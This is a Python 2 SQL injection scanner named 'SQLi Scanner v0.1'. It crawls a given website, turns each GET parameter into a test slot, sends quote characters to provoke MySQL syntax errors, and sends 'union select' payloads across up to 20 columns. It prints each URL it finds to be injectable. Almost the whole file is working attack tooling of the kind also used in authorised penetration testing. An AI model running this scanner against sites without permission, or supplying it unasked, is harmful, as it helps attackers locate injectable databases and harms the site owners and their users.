#!/usr/bin/python
import urllib2
import urlparse
import time
import pprint
import string
import argparse
import sys
from termcolor import colored, cprint

import BeautifulSoup

parser = argparse.ArgumentParser(prog='./sqli.py', usage='%(prog)s [-u URL]')
parser.add_argument('-u', '--url', dest='url', nargs='?', default="empty", help='Website domain for scanning (e.g. http://example.com)')
args = parser.parse_args()
inputURL = args.url

resultUrl = {inputURL:False}
uniqurl = {}
totalVulns = {'UNION':0};

def processOneUrl(url):
    """fetch URL content and update resultUrl."""
    try:       # in case of 404 error
        html_page = urllib2.urlopen(url)
        soup = BeautifulSoup.BeautifulSoup(html_page)
        for link in soup.findAll('a'):
            fullurl = urlparse.urljoin(url, link.get('href'))
            if fullurl.startswith(inputURL):
                if (fullurl not in resultUrl):
                    resultUrl[fullurl] = False
        resultUrl[url] = True       # set as crawled
    except:
        resultUrl[url] = True   # set as crawled

def moreToCrawl():
    """returns True or False"""
    for url, crawled in iter(resultUrl.iteritems()):
        if not crawled:
            # Check if paramter input is for GET URLs
            if "?" in url:
                arrayid = ""
                idtotal = 0
                spliturl = url.split("?")
                newurl = spliturl[0]
                splitvars = spliturl[1].split("&")
                if len(splitvars) > 0:
                    for varid in splitvars:
                        if "=" in arrayid:
                            arrayid += "&"
                        splitid = varid.split("=")
                        arrayid += splitid[0]
                        arrayid += "=[XX]"
                        idtotal += 1
                else:
                    arrayid = spliturl[1]
                addurl = newurl + "?" + arrayid
                if format(addurl) not in uniqurl:
                    uniqurl[format(addurl)] = "false"

            return url
    return False

def banner():
    banner =  "+-----------------------------------------------------------+\n"
    banner += "|                     SQLi Scanner v0.1                     |\n"
    banner += "|                       by Adam King                        |\n"
    banner += "+-----------------------------------------------------------+"
    print format(banner)
    if inputURL == 'empty':
        parser.print_help()
        exit(0)
        

def checkMysqlError(url):
    #print colored("[*] MySQL {0}".format(url), "cyan")
    testUrl = url.replace("[XX]", "'");
    content = urllib2.urlopen(testUrl).read()
    if "You have an error in your SQL syntax" in content:
        return "true"
    testUrl = url.replace("[XX]", '"');
    content = urllib2.urlopen(testUrl).read()
    if "You have an error in your SQL syntax" in content:
        return "true"
    return "false"

def checkMysqlUnion(url, start, finish):
    testUrl = url.replace("[XX]", "1%20union%20select%20[VARS]");
    unionvars = ""
    uniqid = "726486"
    for x in range(start, finish):
        if len(unionvars) > 0:
            unionvars += ","
        unionvars += str(x) + uniqid
        unionurl = testUrl.replace("[VARS]", unionvars)
        #print colored("[*] URL {0}".format(unionurl), "cyan")
        content = urllib2.urlopen(unionurl).read()
        if uniqid in content:
            showurl = unionurl.replace(uniqid, "")
            print colored("[+] MySQL Union Injection Found ({0} column) - {1}".format(x, showurl), "green")
            totalVulns['UNION'] += 1
            return x
    return "false"

def summary():
    end_time = round(time.time() - start_time, 2)
    for sqltype, total in iter(totalVulns.iteritems()):
        print colored("[*] Completed: Total of {1} {0} vulnerabilities found in : {2} seconds".format(sqltype, total, end_time), "green")


def main():
    banner()
    print colored("[*] Crawling: {0} (This may take a few minutes)".format(inputURL), "cyan")
    while True:
        toCrawl = moreToCrawl()
        if not toCrawl:
            break
        processOneUrl(toCrawl)
        #time.sleep(1)
    if len(uniqurl) == 0:
        print colored("[-] Unable to identify any URLs or inputs".format(inputURL), "red")
        exit(0)
    print "[*] Testing {0} unique URLS and inputs".format(len(uniqurl))
    # Check for any MySQL based errors
    stopTesting = "false"
    print colored("[*] Performing HTTP tests", "cyan")
    for url, getvars in iter(uniqurl.iteritems()):
        sqlconfirm = "false"
        if stopTesting <> "true": 
            # Test for any MySQL Errors
            print colored("[+] Error Based Tests: '{0}'".format(url), "cyan")
            testurl = checkMysqlError(url)
            if testurl == "true":
                print colored("[+] [{0}] - MySQL Error(s) Found", "green")
            # Test for union based injection
            start = 1
            finish = 10
            print colored("[+] Union Based Tests ({1} - {2} columns): '{0}'".format(url, start, finish), "cyan")
            testurl = checkMysqlUnion(url, start, finish)
            if testurl <> "false":
                sqlconfirm = "true"
            else:
                start = 11
                finish = 20
                print colored("[+] Union Based Tests ({1} - {2} columns): '{0}'".format(url, start, finish), "cyan")
                testurl = checkMysqlUnion(url, start, finish)
                if testurl <> "false":
                    sqlconfirm = "true"
            # if sqli is confirmed, prompt to exit
            if sqlconfirm == "true":
                print colored("[+] Appears the website maybe vulenrable to SQL injection on {0}".format(url), "green")
                answer = raw_input(colored("[*] Do you want to contune testing other scripts(Y/N)? ", "red"))
                if answer == "N":
                    stopTesting = "true"
        else:
            break
    summary()

start_time = time.time()
main()
